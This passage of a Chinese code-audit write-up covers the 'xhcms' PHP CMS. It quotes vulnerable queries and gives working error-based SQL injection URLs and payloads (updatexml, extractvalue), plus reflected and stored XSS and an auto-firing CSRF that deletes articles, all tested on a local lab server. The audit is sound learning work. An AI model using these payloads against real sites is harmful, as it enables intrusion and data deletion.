    }
    $query = "UPDATE link SET 
    name='$name',
    url='$url',
    mail='$mail',
    jieshao='$jieshao',
    xs='$xs',
    date=now()
    WHERE id='$id'";
    @mysql_query($query) or die('修改错误：'.mysql_error());
    echo ""; 
    exit;
    }
    ?>
这里还是只有单引号闭合,利用方式和之前的差不多,只需要GET一个id参数即可,甚至不用去控type参数就可以直接注入
    http://192.168.121.130/xhcms/admin/?r=editlink&type=2&id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
也可以在post参数那里直接注入
    1' or updatexml(1,concat(0x7e,(select database())),0) or'
### /admin/files/editsoft.php
一样的get一个id参数可以注入
    1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
在下面的输入框也能注入
    1' or updatexml(1,concat(0x7e,(select database())),0) or'
### /admin/files/editwz.php
和上面无异
### /admin/files/imageset.php
和上面无异,只是这里不会GET一个id参数,只有content那里加了一个addslashes处理其他的并没有
这里可以上传文件,但是好像没法利用
### /admin/file/manageinfo.php
不提交id参数,post方式在输入框仍然可以注入
不过这里还有一个xss,还是个存储型xss
因为这里的参数并没有用htmlspecialchars()或htmlentities()函数过滤
由此可以看出前面没有对参数处理的那些输入框可能也会存在xss,试了试都可以
这些文件都除了adset都存在sql注入,而且利用条件出奇的一致
### /files/content.php
这个文件需要从/index.php进去,同样是利用文件包含
    http://192.168.121.130/xhcms/?r=content
源码
这里的id虽然经过了$id=addslashes($_GET['cid']);处理,但是sql语句没有单引号保护,可以直接注入
    $query = "UPDATE content SET hit = hit+1 WHERE id=$id";
    http://192.168.121.130/xhcms/?r=content&cid=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)
### /files/software.php
sql语句依然是没有单引号保护,利用方式如上
### /files/submit.php
源码
    ""){
    $query = "DELETE FROM content WHERE id='$delete'";
    $result = mysql_query($query) or die('SQL语句有误：'.mysql_error());
    echo "";
    exit; 
    }
这里对delete参数没有经过严格的过滤,可以进行SQL注入
    http://192.168.121.130/xhcms/admin/?r=wzlist&delete=1' or extractvalue(1,concat(0x7e,(select version()),0x7e))--+
### /admin/files/softlist.php
和上个文件一样,出现漏洞点的代码都是一样的,打开文件就能看到
    $delete=$_GET['delete'];
    if ($delete<>""){
    $query = "DELETE FROM download WHERE id='$delete'";
    $result = mysql_query($query) or die('SQL语句有误：'.mysql_error());
    echo "";
    exit; 
    }
    ?>
## XSS
以上的SQL注入的文件,大多数输入框那里并没有对输入框中的文本进行处理会存在xss漏洞,并且那种保存下来的还是存储型的xss漏洞,这里就不再赘述
### /files/contact.php
漏洞位置：files/contact.php 第12~15行
    $page=addslashes($_GET['page']);
    if ($page<>""){
    if ($page<>1){
    $pages="第".$page."页 - ";
这里的$page经过addslashes处理一次带入了页面
传参试试
page就是留言板的页数
这是一个反射型的xss
### /files/content.php
这个文件除了SQL注入,还存在一个存储型的xss
这个页面访问需要加上cid参数
    http://192.168.121.130/xhcms/?r=content&cid=1
126-141行
    回复 # 楼
    ">
    认证站长
    位置：
    时间：
    来自：
这里是从$pinglun这个变量中取出其中的信息，随后插入存储信息的interaction表
在第154行
    ">
这里在content页面提交后会跳转到
    http://192.168.121.130/?r=submit&type=comment&cid=1
在submit.php中第48行
    $content= addslashes(strip_tags($content));//过滤HTML
虽然在评论处可以提交昵称、邮箱、网址、评论内容，但是显示评论和留言的地方只有昵称，所以只有昵称处有存储型XSS。
这里我并没有测试成功因为我的跳转页面好像出了一点问题,他跳转到了
    http://192.168.121.130/?r=submit&type=comment&cid=1
而我的目录下不存在这个文件啊,应该跳转到的是
    http://192.168.121.130/xhcms?r=submit&type=comment&cid=1
不过在我更换网站根目录为xhcms后测试成功
每次访问这个页面都会弹窗
其实我在contact页面尝试也发现了这个存储型xss
## CSRF
### /admin/files/wzlist.php
    关键代码:
    $delete=$_GET['delete'];
    if ($delete<>""){
    $query = "DELETE FROM content WHERE id='$delete'";
    $result = mysql_query($query) or die('SQL语句有误：'.mysql_error());
    echo "";
    exit; 
    }
之前说的这里是一个SQL注入,因为他这里的参数没有进行过滤,也没有执行token验证
不过这也可以造成csrf
先抓个包,用burp的一键生成poc
访问一下
点击后,跳转到了
这个需要我们登陆的是admin账户
这种方式虽然成功了，但是必须跟用户产生交互才能执行成功，因此我们需要更改一下代码，使它更难被发现。
增加两行js脚本代码，从而实现自动化虚拟请求
点进去自动跳转
可以看到已经删除了
其实这里不用这么麻烦,可以直接修改URL就可以删除任意一篇文章
### /admin/files/softlist.php
和上个文件一样,出现漏洞点的代码都是一样的,打开文件就能看到
    $delete=$_GET['delete'];
    if ($delete<>""){
    $query = "DELETE FROM download WHERE id='$delete'";
    $result = mysql_query($query) or die('SQL语句有误：'.mysql_error());
    echo "";
    exit; 
    }
    ?>
# 后记
整个cms的代码总体来说比较简单,比较时候入门的时候来做,这也是一次做代码审计,后面可以做做bluecms的审计,难度也比较时候代码审计的入门
通过这次审计对cms的审计方式有了一定的了解,测试的时候利用漏洞的方式和靶场的还是不太一样,需要结合多个文件去利用,有些页面需要利用文件包含才能访问
这个cms的话,漏洞挺多的,这种简单的SQL和文件包含现在在大多数cms中肯定也不会出现了吧,肯定也有还没有涉及到的,seay和RIPS不能完全给出正确答案,在审计的时候还是要自己去审计一下代码
写的有不对地方还希望大佬斧正
参考链接: